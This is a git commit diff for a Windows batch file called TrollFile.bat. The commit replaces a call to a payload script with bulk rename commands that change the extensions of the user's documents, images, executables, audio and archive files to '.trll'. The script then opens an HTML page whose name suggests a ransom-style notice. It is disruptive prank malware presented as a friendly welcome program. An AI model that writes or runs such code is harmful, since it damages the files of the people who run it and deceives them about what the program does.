59c7a45ff97a8350dcc3f84cf46b52c9f648a637
Gridman7 <35380100+Gridman7@users.noreply.github.com>
2018-01-22 19:37:23 -0500

    Update TrollFile.bat

--- TrollFile.bat
+++ TrollFile.bat
@@ -1,5 +1,16 @@
 @echo off
 echo Welcome to TrollFile
 Pause
-start pyld_main.bat
+ren *.txt *.trll
+ren *.doc *.trll
+ren *.jpg *.trll
+ren *.png *.trll
+ren *.bmp *.trll
+ren *.exe *.trll
+ren *.mp3 *.trll
+ren *.wav *.trll
+ren *.ogg *.trll
+ren *.htm *.trll
+ren *.zip *.trll
+ren *.gif *.trll
 start TrollFile_rs.html
